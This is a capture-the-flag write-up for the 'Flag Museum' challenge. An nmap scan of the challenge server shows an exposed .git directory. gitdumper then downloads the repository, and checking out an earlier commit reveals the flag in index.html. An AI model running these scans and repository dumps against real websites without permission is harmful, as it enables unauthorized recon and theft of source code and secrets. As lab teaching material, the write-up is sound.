# Flag Museum

**Points**: 75

http://pwn.osucyber.club:13375/

The flag museum recently took their flags "off exhibit". Can you recover them?

### Solution

```sh
$ nmap -v -A pwn.osucyber.club -Pn -p13370-13380
...
13375/tcp open     http    nginx 1.17.9
| http-git:
|   3.136.13.55:13375/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: flags are off-exhibit
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.17.9
|_http-title: Site doesn't have a title (text/html).
...
```

Using `gitdumper` from [GitTools](https://github.com/internetwache/GitTools),
we can recover the whole git repository.
```sh
bash gitdumper.sh http://3.136.13.55:13375/.git/ ~/Programs/osu-ctf-2020-spring/clone
```

Running `git log`
```git
$ git log
commit 8de0c52a190448900fa4445ec0f2020a504a224a (HEAD)
Author: super secure coder <haxx0r@osu.edu>
Date:   Sun Mar 22 17:28:34 2020 -0400

    flags are now on exhibit

commit f2e86a8f83881fb18a5742b484b183d1fc5115fc
Author: super secure coder <haxx0r@osu.edu>
Date:   Sun Mar 22 17:25:36 2020 -0400

    Initial commit

```

Then `git checkout HEAD~1` gives us `index.html`:
```html
<html>
<body>
<h1>Flag Museum</h1>
<p>We currently have one flag on exhibit</p>
<p>osuctf{dont_keep_secrets_in_git_and_dont_expose_the_repo_on_your_website}</p>
</body>
</html>
```
